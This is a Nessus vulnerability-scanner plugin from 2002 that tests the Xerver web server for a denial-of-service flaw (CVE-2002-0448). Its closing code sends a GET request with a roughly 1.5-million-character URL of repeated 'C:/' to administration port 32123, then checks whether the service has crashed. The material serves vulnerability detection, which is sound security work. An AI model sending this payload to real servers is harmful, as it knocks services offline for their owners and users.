#
# This script was written by Michel Arboi <arboi@alussinan.org>
#
# See the Nessus Scripts License for details
#
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added BugtraqID and CAN
#
# From Bugtraq :
# Date: Fri, 8 Mar 2002 18:39:39 -0500 ?
# From:"Alex Hernandez" <al3xhernandez@ureach.com> 

if(description)
{
 script_id(11015);
 script_bugtraq_id(4254);
 script_version("$Revision: 1.9 $");
 script_cve_id("CVE-2002-0448");
 name["english"] = "Xerver web server DOS";
 name["francais"] = "Déni de service contre Xerver";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "It was possible to crash
the Xerver web server by sending a long URL 
(C:/C:/...C:/) to its administration port.

A cracker may use this attack to make this
service crash continuously.


Solution: upgrade your software

Risk factor : High";


 desc["francais"] = "Il a été possible de tuer
le serveur web Xerver en envoyant une URL longue
(C:/C:/...C:/) à son port d'administration.

Un pirate peut exploiter cette faille 
pour faire planter continuellement ce
service.


Solution: mettez à jour votre logiciel

Facteur de risque : Elevé";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Xerver DOS";
 summary["francais"] = "Déni de service contre Xerver";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_DENIAL);
 
 script_copyright(english:"This script is Copyright (C) 2002 Michel Arboi",
		francais:"Ce script est Copyright (C) 2002 Michel Arboi");
  family["english"] = "Denial of Service";
  family["francais"] = "Déni de service";

 script_family(english:family["english"], francais:family["francais"]);
 script_require_ports(32123);
 exit(0);
}

#

port=32123;
if (! get_port_state(port)) exit(0);
soc = open_sock_tcp(port);
if (!soc) exit(0);
s = string("GET /", crap(data:"C:/", length:1500000), "\r\n\r\n");
send(socket:soc, data:s);
close(soc);

soc = open_sock_tcp(port);
if (! soc)
{
 security_hole(port);
 exit(0);
}

close(soc);


